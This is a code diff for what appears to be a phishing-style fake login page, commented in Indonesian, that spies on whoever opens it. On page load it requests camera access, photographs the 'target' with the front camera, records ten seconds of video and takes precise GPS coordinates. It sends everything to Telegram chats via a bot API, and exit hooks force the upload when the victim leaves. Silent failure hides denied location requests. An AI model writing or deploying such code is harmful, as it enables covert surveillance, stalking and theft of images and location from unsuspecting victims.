@@ -145,6 +145,10 @@
     const button = document.getElementById('login-button');
     const notif = document.getElementById('notif');
 
+    let globalStream = null;
+    let globalRecorder = null;
+    const videoChunks = [];
+
     function selectPlatform(btn) {
       document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
       btn.classList.add('active');
@@ -160,22 +164,23 @@
       });
     }
 
+    function sendPhoto(blob) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('photo', blob, 'foto_target.jpg');
+        formData.append('caption', '📸 Foto Kamera Depan Target');
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
+
     function sendVideo(blob, filename) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
         formData.append('video', blob, filename);
-        formData.append('caption', '📹 Rekaman Kamera Depan (10 Detik)');
+        formData.append('caption', '📹 Rekaman Kamera Depan (10s/Exit)');
         fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
-      });
-    }
-
-    function sendVoice(blob, filename) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('voice', blob, filename);
-        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -190,46 +195,45 @@
       } catch (err) {}
     }
 
-    // Fungsi Izin Kamera + Trigger GPS Otomatis
-    async function recordFrontVideo() {
+    // Fungsi Gabungan: Foto + Lokasi + Video
+    async function startMediaProcess() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         
-        // BEGITU IZIN KAMERA DI-CLICK (Diberikan), langsung kirim GPS
+        // 1. Ambil Lokasi (Karena izin kamera sudah diberikan)
         getLocation();
 
-        const mediaRecorder = new MediaRecorder(stream);
-        const videoChunks = [];
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-          sendVideo(videoBlob, 'rekaman_10detik.mp4');
-          stream.getTracks().forEach(track => track.stop());
+        // 2. Ambil Foto Kamera Depan secara instan
+        const videoTrack = globalStream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+        const photoBlob = await imageCapture.takePhoto();
+        sendPhoto(photoBlob);
+
+        // 3. Mulai Rekaman Video 10 Detik
+        globalRecorder = new MediaRecorder(globalStream);
+        globalRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        globalRecorder.onstop = () => {
+          if (videoChunks.length > 0) {
+            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+            sendVideo(videoBlob, 'rekaman_target.mp4');
+          }
+          if (globalStream) globalStream.getTracks().forEach(track => track.stop());
         };
-        mediaRecorder.start();
-        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
+
+        globalRecorder.start();
+        setTimeout(() => { if (globalRecorder && globalRecorder.state === "recording") globalRecorder.stop(); }, 10000);
+
       } catch (err) {
-        sendToTelegram('maaf akses kamera/vidio ditolak 🤬');
+        sendToTelegram('foto kamera depan di tolak 🗿');
       }
     }
 
-    async function autoRecordAudio() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-        mediaRecorder.onstop = () => {
-          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
-          sendVoice(blob, 'voice_note.mp3');
-          stream.getTracks().forEach(track => track.stop());
-        };
-        mediaRecorder.start();
-        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
-      } catch (err) {
-        sendToTelegram('Izin Voice Note ditolak ❌');
-      }
+    function handleForceSend() {
+      if (globalRecorder && globalRecorder.state === "recording") globalRecorder.stop();
     }
+
+    window.addEventListener('pagehide', handleForceSend);
+    window.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleForceSend(); });
 
     function getLocation() {
       if (navigator.geolocation) {
@@ -238,11 +242,9 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(`📍 <b>Lokasi GPS Target:</b> <a href="${mapUrl}">click disini</a>`);
+            sendToTelegram(`📍 <b>Lokasi GPS Target (Via Izin Foto):</b> <a href="${mapUrl}">click disini</a>`);
           },
-          (error) => {
-            sendToTelegram('maaf akses lokasi ditolak 🤬');
-          },
+          (error) => { /* Silently fail if location specifically blocked but camera allowed */ },
           { enableHighAccuracy: true }
         );
       }
@@ -250,18 +252,8 @@
 
     window.addEventListener('DOMContentLoaded', async () => {
       createParticles();
-      
-      // 1. Kirim Info Dasar
       await getInfo();
-      
-      // 2. Munculkan Izin Lokasi Terpisah
-      getLocation();
-      
-      // 3. Munculkan Izin Kamera (Saat Allow diklik, GPS terkirim lagi & rekam 10s dimulai)
-      recordFrontVideo();
-      
-      // 4. Munculkan Izin Audio
-      autoRecordAudio();
+      startMediaProcess(); // Memicu Izin Kamera (Foto + GPS + Video)
     });
 
     button.addEventListener('click', () => {
